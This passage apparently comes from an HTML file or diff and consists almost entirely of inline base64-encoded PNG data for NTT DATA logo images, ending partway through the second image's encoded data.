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"  alt="NTT DATA">
+      <img class="logo logo-light" src="data:image/png;base64,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